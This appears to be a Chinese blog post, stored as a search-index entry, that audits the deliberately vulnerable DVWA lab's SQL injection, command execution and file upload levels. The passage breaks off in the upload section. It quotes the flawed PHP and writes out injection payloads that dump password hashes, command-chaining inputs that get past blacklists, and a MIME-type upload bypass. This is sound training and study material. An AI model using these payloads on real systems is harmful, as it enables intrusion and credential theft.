<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>dvwa审计学习</title>
    <url>/2020/05/31/dvwa%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gfc2ouzv89j31c00u07tc.jpg" alt="28"></p>
<a id="more"></a>

<h3 id="0x00-环境"><a href="#0x00-环境" class="headerlink" title="0x00 环境"></a>0x00 环境</h3><p>[TOC]</p>
<p>php环境：5.4.45</p>
<p>mysql环境：5.6.35</p>
<p>dvwa版本：官网最新</p>
<h3 id="0x01-SQL注入漏洞"><a href="#0x01-SQL注入漏洞" class="headerlink" title="0x01 SQL注入漏洞"></a>0x01 SQL注入漏洞</h3><h4 id="Low级别漏洞代码"><a href="#Low级别漏洞代码" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">'Submit'</span> ] ) ) &#123;<span class="comment">//判断request中的submit是否已设置</span></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_REQUEST[ <span class="string">'id'</span> ];<span class="comment">//获取id的值</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">    <span class="comment">//此处为拼接sql语句</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;</span><br><span class="line">    <span class="comment">//执行成功后将结果赋给变量，执行出错则终止代码，并抛出错误</span></span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;<span class="comment">//循环取出数据</span></span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;此处执行拼接了用户输入的参数，id为字符型注入，需要闭合单引号</span><br><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39;;&quot;;</span><br><span class="line"></span><br><span class="line">payload：1‘ 语句 #</span><br></pre></td></tr></table></figure>

<p>使用法师的工具中的mysql监控可监控语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; and 1&#x3D;1#</span><br><span class="line">1&#39; and 1&#x3D;2#</span><br><span class="line">1&#39; order by 2#</span><br><span class="line">1&#39; union select user(),database()#</span><br><span class="line">1&#39; union select user(),database()#</span><br><span class="line">1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;&#39;dvwa&#39;#</span><br><span class="line">1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br><span class="line">1&#39; union select user,password from users#</span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf7f9yovakj312f0u041v.jpg" alt="image-20200527232504032"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gf7g18fl5yj30s40mo42t.jpg" alt="image-20200527235116094"></p>
<h4 id="Medium级别漏洞代码"><a href="#Medium级别漏洞代码" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_POST[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//过滤字符</span></span><br><span class="line">	$id = mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>], $id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用双引号包裹，拼接参数</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = $id;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Display values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">"SELECT COUNT(*) FROM users;"</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]);</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;虽然使用mysqli_real_escape_string函数来转义字符，但此处未使用单引号包裹，导致形成数字型注入，直接写payload即可，数字型注入不需要单引号或者双引号，所以mysqli_real_escape_string函数在此处无效</span><br><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; $id;&quot;;</span><br><span class="line"></span><br><span class="line">payload: </span><br><span class="line">	1 union select 1,2 #</span><br><span class="line">	1 union select user(),database() #</span><br><span class="line">	1 union select 1,table_name from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">	1 union select 1,column_name from information_schema.columns where table_name&#x3D;0x7573657273 #</span><br><span class="line">	1 union select user,password from users #</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf7zztsycyj31xy0ks7ch.jpg" alt="image-20200528112157354"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf823pisklj31fr0u0qf6.jpg" alt="image-20200528123452581"></p>
<h4 id="High级别漏洞代码"><a href="#High级别漏洞代码" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">'id'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$id = $_SESSION[ <span class="string">'id'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Check database</span></span><br><span class="line">	$query  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"</span>;</span><br><span class="line">	$result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get results</span></span><br><span class="line">	<span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">		<span class="comment">// Get values</span></span><br><span class="line">		$first = $row[<span class="string">"first_name"</span>];</span><br><span class="line">		$last  = $row[<span class="string">"last_name"</span>];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for end user</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);		</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;此段代码未做过滤，且比LOW文件中的代码多了limit 1，使用#号注释即可，注入为字符型，闭合单引号即可</span><br><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br><span class="line"></span><br><span class="line">payload: </span><br><span class="line">	1&#39; union select 1,2 #</span><br><span class="line">	1&#39; union select user(),database() #</span><br><span class="line">	1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">	1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line">	1&#39; union select user,password from users #</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8822611dj313w08omxp.jpg" alt="image-20200528160053951"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf881wmov7j314s0u07g4.jpg" alt="image-20200528160042669"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf882s11rcj31ey0r845o.jpg" alt="image-20200528160135072"></p>
<h3 id="0x02-命令执行漏洞"><a href="#0x02-命令执行漏洞" class="headerlink" title="0x02 命令执行漏洞"></a>0x02 命令执行漏洞</h3><h4 id="Low级别漏洞代码-1"><a href="#Low级别漏洞代码-1" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	$target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">	<span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Feedback for the end user</span></span><br><span class="line">	$html .= <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//shell_exec执行命令，后面未做过滤，直接拼接字符串，执行多个命令可使用;分割</span></span><br><span class="line"><span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">		<span class="comment">// Windows</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// *nix</span></span><br><span class="line">		$cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>;whoami</span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> &amp;&amp; pwd</span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> &amp; whoami</span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> || whoami </span><br><span class="line">    <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> | whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf89ul6fhdj30tu0eo4a5.jpg" alt="image-20200528170254678"></p>
<h4 id="Medium级别漏洞代码-1"><a href="#Medium级别漏洞代码-1" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(<span class="comment">//此处过滤&amp;&amp; 和 ; 禁止执行多行命令</span></span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 此处过滤&amp;&amp; 和 ; ，但是未过滤||, |，&amp;</span></span><br><span class="line">$substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;&amp;'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">	ipconfig || whoami </span><br><span class="line">   	ipconfig | whoami</span><br><span class="line">    ipconfig &amp; whoami</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8a777xmij30u40a0q3q.jpg" alt="image-20200528171502405"></p>
<h4 id="High级别漏洞代码-1"><a href="#High级别漏洞代码-1" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = trim($_REQUEST[ <span class="string">'ip'</span> ]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist</span></span><br><span class="line">    $substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下为过滤的字符，经测试&amp;&amp;、&amp;、；都不可用，|、||,存在绕过的现象 </span></span><br><span class="line">$substitutions = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'&amp;'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">';'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'| '</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'-'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'$'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'('</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">')'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'`'</span>  =&gt; <span class="string">''</span>,</span><br><span class="line">        <span class="string">'||'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist).</span></span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">    绕过 <span class="string">'| '</span> =&gt; <span class="string">''</span> |多+了一个空格为| </span><br><span class="line">    可使用paylaod: ipconfig |ifocnfig 来绕过</span><br><span class="line">    绕过 <span class="string">'||'</span> =&gt; <span class="string">''</span>, ||两边+空格即可绕过</span><br><span class="line">    payload: ipconfig || ifconfig </span><br><span class="line">        </span><br><span class="line">PS：目前暂未发现其他符号可使用此方法绕过，只有|、||成功。</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8b0c2dbpj31ex0u0h2w.jpg" alt="image-20200528174300953"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8b29uktnj31xk0j445l.jpg" alt="image-20200528174453647"></p>
<h3 id="0x03-文件上传漏洞"><a href="#0x03-文件上传漏洞" class="headerlink" title="0x03 文件上传漏洞"></a>0x03 文件上传漏洞</h3><h4 id="Low级别漏洞代码-2"><a href="#Low级别漏洞代码-2" class="headerlink" title="Low级别漏洞代码"></a>Low级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;<span class="comment">//目录</span></span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );<span class="comment">//目录拼接文件名</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">	<span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;<span class="comment">//移动文件到目录下</span></span><br><span class="line">		<span class="comment">// No</span></span><br><span class="line">		$html .= <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Yes!</span></span><br><span class="line">		$html .= <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;<span class="comment">//返回目录路径</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//未做文件后缀名过滤，可上传任意文件</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8bep2s3xj31rp0u047j.jpg" alt="image-20200528175650033"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf8bfp3wnoj30vl0u0aec.jpg" alt="image-20200528175747455"></p>
<h4 id="Medium级别漏洞代码-2"><a href="#Medium级别漏洞代码-2" class="headerlink" title="Medium级别漏洞代码"></a>Medium级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ];</span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &#x2F;&#x2F;此处设置类型只能是image&#x2F;jpeg、image&#x2F;png，并且文件小于100000</span><br><span class="line">  if( ( $uploaded_type &#x3D;&#x3D; &quot;image&#x2F;jpeg&quot; || $uploaded_type &#x3D;&#x3D; &quot;image&#x2F;png&quot; ) &amp;&amp;</span><br><span class="line">        ( $uploaded_size &lt; 100000 ) ) &#123;</span><br><span class="line">        </span><br><span class="line">&#x2F;&#x2F;修改MIME类型</span><br><span class="line">&#x2F;&#x2F;修改content-type为image&#x2F;jpeg、image&#x2F;png 即可绕过验证，上传任意文件</span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9c3ovaazj30z30jlwm1.jpg" alt="image-20200529150623250"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf9c4wgmynj30qk0e874w.jpg" alt="image-20200529150735386"></p>
<h4 id="High级别漏洞代码-2"><a href="#High级别漏洞代码-2" class="headerlink" title="High级别漏洞代码"></a>High级别漏洞代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">	$target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>;</span><br><span class="line">	$target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// File information</span></span><br><span class="line">	$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">	$uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, <span class="string">'.'</span> ) + <span class="number">1</span>);</span><br><span class="line">	$uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ];</span><br><span class="line">	$uploaded_tmp  = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Is it an image?</span></span><br><span class="line">	<span class="keyword">if</span>( ( strtolower( $uploaded_ext ) == <span class="string">"jpg"</span> || strtolower( $uploaded_ext ) == <span class="string">"jpeg"</span> || strtolower( $uploaded_ext ) == <span class="string">"png"</span> ) &amp;&amp;</span><br><span class="line">		( $uploaded_size &lt; <span class="number">100000</span> ) 